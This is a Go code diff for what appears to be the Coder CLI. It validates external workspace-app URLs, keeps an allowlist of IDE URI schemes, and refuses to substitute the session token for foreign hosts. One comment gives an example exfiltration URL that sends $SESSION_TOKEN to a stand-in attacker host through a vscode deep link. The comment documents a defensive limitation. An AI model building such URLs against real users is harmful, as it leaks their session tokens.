@@ -388,7 +388,15 @@ func (r *RootCmd) openApp() *serpent.Command {
 			appURL := buildAppLinkURL(baseURL, ws, agt, foundApp, region.WildcardHostname, pathAppURL)
 
 			if foundApp.External {
-				appURL = replacePlaceholderExternalSessionTokenString(client, appURL)
+				sanitized, substitute, err := resolveExternalAppURL(client.URL, appURL)
+				if err != nil {
+					cliui.Errorf(inv.Stderr, "%s", err)
+					return err
+				}
+				appURL = sanitized
+				if substitute {
+					appURL = replacePlaceholderExternalSessionTokenString(client, appURL)
+				}
 			}
 
 			// Check if we're inside a workspace.  Generally, we know
@@ -669,10 +677,97 @@ func buildAppLinkURL(baseURL *url.URL, workspace codersdk.Workspace, agent coder
 // strings in the URL with the actual session token.
 // This is consistent behavior with the frontend. See: site/src/modules/resources/AppLink/AppLink.tsx
 func replacePlaceholderExternalSessionTokenString(client *codersdk.Client, appURL string) string {
-	if !strings.Contains(appURL, "$SESSION_TOKEN") {
+	if !strings.Contains(appURL, externalSessionTokenPlaceholder) {
 		return appURL
 	}
 
 	// We will just re-use the existing session token we're already using.
-	return strings.ReplaceAll(appURL, "$SESSION_TOKEN", client.SessionToken())
+	return strings.ReplaceAll(appURL, externalSessionTokenPlaceholder, client.SessionToken())
+}
+
+// externalSessionTokenPlaceholder is substituted with the user's session
+// token in external workspace app URLs when the destination is trusted.
+// Must stay in sync with SESSION_TOKEN_PLACEHOLDER in
+// site/src/modules/apps/apps.ts.
+const externalSessionTokenPlaceholder = "$SESSION_TOKEN"
+
+// allowedExternalAppProtocols are the URL schemes the CLI will hand to the
+// OS open handler for external workspace apps, and the only schemes for
+// which the user's session token is substituted into the URL.
+//
+// Keep in sync with ALLOWED_EXTERNAL_APP_PROTOCOLS in
+// site/src/modules/apps/apps.ts.
+var allowedExternalAppProtocols = []string{
+	"vscode",
+	"vscode-insiders",
+	"windsurf",
+	"cursor",
+	"jetbrains-gateway",
+	"jetbrains",
+	"kiro",
+	"positron",
+	"antigravity",
+	"zed",
+}
+
+// resolveExternalAppURL validates an external workspace-app URL before it is
+// handed to the OS open handler and decides whether the user's session token
+// may be substituted into it.
+//
+// External workspace apps are attacker-controlled: a malicious workspace can
+// register an app with an arbitrary URL via the sub-agent API. Without
+// validation, `coder open app` would hand that URL to the OS open handler
+// (xdg-open, open, ShellExecute) and substitute the user's session token
+// into any $SESSION_TOKEN placeholder, leaking the token to attacker hosts
+// or silently invoking local URI handlers.
+//
+// The rules are:
+//   - Schemes in allowedExternalAppProtocols: open and substitute the
+//     session token. These IDE deep-link handlers are the intended
+//     consumers of the token.
+//   - http and https whose host equals the deployment's access URL host:
+//     open and substitute. The token is being returned to its own issuer.
+//   - http and https to any other host without the $SESSION_TOKEN
+//     placeholder: open without substitution. Matches the web UI's
+//     behavior for arbitrary http(s) external apps.
+//   - http and https to any other host with the $SESSION_TOKEN placeholder:
+//     refuse. This is the exfiltration case.
+//   - Any other scheme (file, mailto, slack, custom URI handlers, etc.):
+//     refuse. The OS open handler dispatches a URL to its registered
+//     handler app without any OS-level confirmation, so non-allowlisted
+//     schemes can trigger arbitrary handler-defined actions on the user's
+//     machine without the user being prompted.
+//
+// Limitation: this guards the CLI boundary only. It does not prevent token
+// exfiltration via an allowlisted scheme handler that itself accepts a
+// deployment URL as a parameter (e.g. vscode://coder.coder-remote/open
+// ?url=https://attacker.example&token=$SESSION_TOKEN). That class of attack
+// has to be addressed in the handler.
+func resolveExternalAppURL(deploymentURL *url.URL, rawAppURL string) (sanitized string, substitute bool, err error) {
+	u, err := url.Parse(rawAppURL)
+	if err != nil {
+		return "", false, xerrors.Errorf("parse external app URL: %w", err)
+	}
+	scheme := strings.ToLower(u.Scheme)
+	containsToken := strings.Contains(rawAppURL, externalSessionTokenPlaceholder)
+
+	if slices.Contains(allowedExternalAppProtocols, scheme) {
+		return rawAppURL, true, nil
+	}
+	if scheme == "http" || scheme == "https" {
+		if deploymentURL != nil && strings.EqualFold(u.Host, deploymentURL.Host) {
+			return rawAppURL, true, nil
+		}
+		if containsToken {
+			return "", false, xerrors.Errorf(
+				"refusing to open external app: URL %q targets an external host and would leak the session token",
+				rawAppURL,
+			)
+		}
+		return rawAppURL, false, nil
+	}
+	return "", false, xerrors.Errorf(
+		"refusing to open external app: scheme %q is not in the allowed protocol list",
+		u.Scheme,
+	)
 }
